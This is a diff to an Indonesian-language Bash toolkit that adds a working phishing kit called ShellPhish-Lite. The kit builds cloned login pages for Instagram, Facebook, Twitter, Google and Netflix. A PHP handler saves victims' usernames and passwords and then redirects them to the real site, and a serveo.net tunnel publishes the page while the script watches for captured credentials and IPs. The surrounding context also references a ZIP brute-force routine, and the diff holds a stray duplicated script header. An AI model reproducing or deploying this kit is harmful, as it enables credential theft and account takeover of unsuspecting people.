@@ -2022,37 +2022,58 @@ clear
     read -p "ENTER UNTUK KEMBALI KE MENU" | lolcat
   done
 }
+#!/bin/bash
+###########################################################################
+#  ShellPhish-Lite – Complete Edition (Termux / Linux)                    #
+###########################################################################
+
+#!/bin/bash
+###########################################################################
+#  ShellPhish-Lite – Complete, Termux/Linux ready                         #
+###########################################################################
+
 phising_allsosmed() {
-    # === warna & banner ===
+    # ---------- warna ----------
     RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'; CYAN='\033[0;36m'; RESET='\033[0m'
     clear
     echo -e "${CYAN}"
-    figlet -f small "ShellPhish-Lite" 2>/dev/null || echo -e "=== ShellPhish ===\n"
+    figlet -f small "ShellPhish-Lite" 2>/dev/null || echo -e "=== ShellPhish-Lite ===\n"
     echo -e "${RESET}"
 
-    # === auto-install dependensi ===
-    for dep in php curl openssh-client; do
-        command -v "$dep" &>/dev/null || { echo -e "${YELLOW}[+] Installing $dep...${RESET}"; sudo apt install "$dep" -y; }
+    # ---------- dependensi ----------
+    for dep in php curl openssh; do
+        if ! command -v "$dep" &>/dev/null; then
+            echo -e "${YELLOW}[+] Installing $dep...${RESET}"
+            pkg install "$dep" -y || apt install "$dep" -y
+        fi
     done
 
-    # === daftar target ===
-    declare -A sites=(
-        [1]="instagram" [2]="facebook" [3]="snapchat" [4]="twitter"
-        [5]="github" [6]="google" [7]="spotify" [8]="netflix"
-        [9]="origin" [10]="steam" [11]="yahoo" [12]="linkedin"
-        [13]="protonmail" [14]="wordpress" [15]="microsoft" [16]="instafollowers"
-        [17]="gitlab" [18]="pinterest" [19]="create"
+    # ---------- daftar target ----------
+    sites=(
+        "instagram" "facebook" "twitter" "google" "netflix"
+        "snapchat" "github" "spotify" "linkedin"
+        "yahoo" "microsoft" "create"
     )
-    echo -e "${GREEN}Pilih target:${RESET}"
-    for k in "${!sites[@]}"; do printf "%2s) %-15s" "$k" "${sites[$k]}"; (( k % 2 == 0 )) && echo; done
-    echo
-    read -p "Pilih [1-19]: " opt
-    server=${sites[$opt]}; [[ -z "$server" ]] && { echo -e "${RED}Pilihan salah!${RESET}"; return; }
 
-    # === custom page otomatis kalau create ===
+    echo -e "${GREEN}Pilih target:${RESET}"
+    for i in "${!sites[@]}"; do
+        printf "%2s) %-15s" "$((i+1))" "${sites[$i]}"
+        (( (i+1) % 3 == 0 )) && echo
+    done
+    echo
+
+    read -p "Pilih [1-${#sites[@]}]: " opt
+    [[ ! "$opt" =~ ^[0-9]+$ ]] || (( opt < 1 || opt > ${#sites[@]} )) && {
+        echo -e "${RED}Pilihan salah!${RESET}"
+        return 1
+    }
+
+    server="${sites[$((opt-1))]}"
+
+    # ---------- custom page ----------
     [[ "$server" == "create" ]] && {
         mkdir -p sites/create
-        cat > sites/create/login.html <<'EOF'
+        cat > sites/create/index.html <<'EOF'
 <!DOCTYPE html>
 <html><body bgcolor="#2c3e50" text="#ecf0f1">
 <center><h2>Wi-Fi Expired<br>Please login again.</h2></center>
@@ -2064,37 +2085,168 @@ phising_allsosmed() {
 EOF
     }
 
-    port=3333
-    mkdir -p "sites/$server"
-    cd "sites/$server"
+    # ---------- folder kerja ----------
+    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)" || SCRIPT_DIR="$PWD"
+    LOG_DIR="$SCRIPT_DIR/logs"
+    mkdir -p "$LOG_DIR"
 
-    # === start PHP server ===
+    port=3333
+    dir="sites/$server"
+    mkdir -p "$dir"
+    cd "$dir" || { echo -e "${RED}Gagal masuk ke $dir${RESET}"; return 1; }
+
+    # ---------- template 1:1 sesuai target ----------
+    case "$server" in
+        instagram)
+            cat > index.html <<'EOF'
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>Instagram</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
+<style>body{background:#fafafa;font-family:'Roboto',sans-serif;margin:0}.wrapper{max-width:350px;margin:60px auto;padding:0 20px}.logo{width:100%;max-width:175px;margin-bottom:30px}.box{background:#fff;border:1px solid #dbdbdb;padding:40px 30px;text-align:center;border-radius:3px}input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px}button{width:100%;padding:8px;background:#0095f6;border:none;border-radius:4px;color:#fff;font-weight:600;margin-top:10px;font-size:14px;cursor:pointer}.footer{margin-top:40px;color:#8e8e8e;font-size:12px;text-align:center}a{color:#00376b;text-decoration:none;font-weight:600}</style></head><body>
+<div class="wrapper"><div class="box">
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/175px-Instagram_logo.svg.png" alt="Instagram">
+<form action="login.php" method="POST">
+<input type="text" name="username" placeholder="Phone number, username, or email" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Log In</button>
+</form>
+<p style="margin-top:20px"><a href="#">Forgot password?</a></p></div>
+<div class="footer">Instagram from Meta</div></div></body></html>
+EOF
+            ;;
+        facebook)
+            cat > index.html <<'EOF'
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Facebook – log in or sign up</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{margin:0;padding:0;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}.wrapper{max-width:400px;margin:80px auto;padding:0 20px}.logo{width:240px;margin-bottom:20px}.box{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,.1)}input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}</style></head><body>
+<center><img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"></center>
+<div class="wrapper"><div class="box">
+<form action="login.php" method="POST">
+<input type="text" name="username" placeholder="Email or phone number" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Log In</button>
+</form></div></div></body></html>
+EOF
+            ;;
+        twitter)
+            cat > index.html <<'EOF'
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Twitter</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{margin:0;font-family:Arial;background:#fff;display:flex;align-items:center;justify-content:center;height:100vh}.box{width:400px;padding:40px}.logo{width:40px;margin-bottom:20px}h2{font-size:23px;margin-bottom:30px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:16px}button{width:100%;padding:12px;background:#1da1f2;color:#fff;border:none;border-radius:25px;font-size:15px;font-weight:bold;cursor:pointer}</style></head><body>
+<div class="box">
+<center><img class="logo" src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png"></center>
+<h2>Log in to Twitter</h2>
+<form action="login.php" method="POST">
+<input type="text" name="username" placeholder="Phone, email or username" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Log in</button>
+</form></div></body></html>
+EOF
+            ;;
+        google)
+            cat > index.html <<'EOF'
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Gmail: Email from Google</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{margin:0;font-family:'Google Sans',Arial;background:#fff}.wrapper{max-width:450px;margin:80px auto;padding:0 20px}.logo{width:120px;margin-bottom:25px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}</style></head><body>
+<center><img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"></center>
+<div class="wrapper">
+<form action="login.php" method="POST">
+<input type="email" name="username" placeholder="Enter your email" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Next</button>
+</form></div></body></html>
+EOF
+            ;;
+        netflix)
+            cat > index.html <<'EOF'
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Netflix</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{margin:0;font-family:Helvetica,Arial;background:#000;color:#fff}.wrapper{max-width:450px;margin:80px auto;padding:0 20px}.logo{width:170px;margin-bottom:30px}input{width:100%;padding:15px;margin:10px 0;border:none;border-radius:4px;font-size:16px}button{width:100%;padding:15px;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}</style></head><body>
+<center><img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg"></center>
+<div class="wrapper">
+<form action="login.php" method="POST">
+<input type="text" name="username" placeholder="Email or phone number" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Sign In</button>
+</form></div></body></html>
+EOF
+            ;;
+        *)  # default untuk yang belum ada template
+            [[ ! -f index.html && ! -f index.php ]] && {
+                cat > index.html <<'EOF'
+<!DOCTYPE html>
+<html><head><title>Login</title></head><body bgcolor="#f2f2f2">
+<center><h2>Login</h2>
+<form method="POST" action="login.php">
+<label>Username:</label><br><input name="username"><br>
+<label>Password:</label><br><input type="password" name="password"><br><br>
+<input type="submit" value="Login">
+</form></center></body></html>
+EOF
+            }
+            ;;
+    esac
+
+    # ---------- login.php universal ----------
+    cat > login.php <<'PHP'
+<?php
+$user = $_POST['username'] ?? '';
+$pass = $_POST['password'] ?? '';
+if ($user && $pass) {
+    file_put_contents('php://stderr', "\n[+] CREDENTIAL BARU =========================\nUsername: $user\nPassword: $pass\n==========================================\n");
+    file_put_contents('usernames.txt', "$user:$pass\n", FILE_APPEND | LOCK_EX);
+}
+$host = basename(dirname(__FILE__));
+$real = ['instagram'=>'instagram.com','facebook'=>'facebook.com','twitter'=>'twitter.com','google'=>'accounts.google.com','netflix'=>'netflix.com'];
+header('Location: https://'.($real[$host]??'google.com'));
+exit;
+PHP
+
+    # ---------- log & tunnel ----------
+    SERVEO_LOG="$LOG_DIR/serveo.log"
+    rm -f "$SERVEO_LOG"
+
     echo -e "${YELLOW}[+] Starting PHP server...${RESET}"
     php -S 127.0.0.1:$port > /dev/null 2>&1 &
     PHP_PID=$!
     sleep 2
 
-    # === start serveo.net tunnel ===
     echo -e "${YELLOW}[+] Starting serveo tunnel...${RESET}"
-    ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:$port serveo.net 2>&1 | tee /tmp/serveo.log &
+    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
+        -R 80:127.0.0.1:$port serveo.net 2>&1 | tee "$SERVEO_LOG" &
     SSH_PID=$!
-    until grep -q 'https://' /tmp/serveo.log; do sleep 1; done
-    LINK=$(grep -Eo 'https://[^ ]+' /tmp/serveo.log | head -n1)
 
-    [[ -z "$LINK" ]] && { echo -e "${RED}Gagal mendapatkan link!${RESET}"; kill $PHP_PID $SSH_PID 2>/dev/null; return; }
+    timeout=20
+    until grep -qE 'https://.*serveo.net' "$SERVEO_LOG" 2>/dev/null || (( timeout <= 0 )); do
+        sleep 1
+        ((timeout--))
+    done
+
+    LINK="$(grep -Eo 'https://[^ ]*serveo.net' "$SERVEO_LOG" 2>/dev/null | head -n1)"
+    [[ -z "$LINK" ]] && {
+        echo -e "${RED}Gagal mendapatkan link!${RESET}"
+        kill "$PHP_PID" "$SSH_PID" 2>/dev/null
+        return 1
+    }
+
     echo -e "\n${GREEN}✓ Link phishing aktif:${RESET} ${CYAN}${LINK}${RESET}\n"
 
-    # === monitor hasil ===
-    LOG_DIR="logs"; mkdir -p "$LOG_DIR"
+    # ---------- monitor ----------
+    trap 'echo -e "\n${YELLOW}Berhenti...${RESET}"; kill $PHP_PID $SSH_PID 2>/dev/null; exit 0' INT
     echo -e "${YELLOW}[+] Menunggu korban... (Ctrl+C untuk berhenti)${RESET}"
     while true; do
-        [[ -f "ip.txt" ]] && { echo -e "${GREEN}[+] IP ditemukan!${RESET}"; mv "ip.txt" "$LOG_DIR/ip_$(date +%s).txt"; }
-        [[ -f "usernames.txt" ]] && { echo -e "${GREEN}[+] Credential ditemukan!${RESET}"; mv "usernames.txt" "$LOG_DIR/creds_$(date +%s).txt"; }
+        [[ -f "ip.txt" ]] && {
+            echo -e "${GREEN}[+] IP ditemukan:${RESET} $(cat ip.txt)"
+            mv "ip.txt" "$LOG_DIR/ip_$(date +%s).txt"
+        }
+        [[ -f "usernames.txt" ]] && {
+            echo -e "${GREEN}[+] Credential ditemukan:${RESET} $(tail -n1 usernames.txt)"
+            mv "usernames.txt" "$LOG_DIR/creds_$(date +%s).txt"
+        }
         sleep 2
     done
 }
-
-
 
 bruteforce_zip() {
   read -p "Masukkan file ZIP: " zipfile
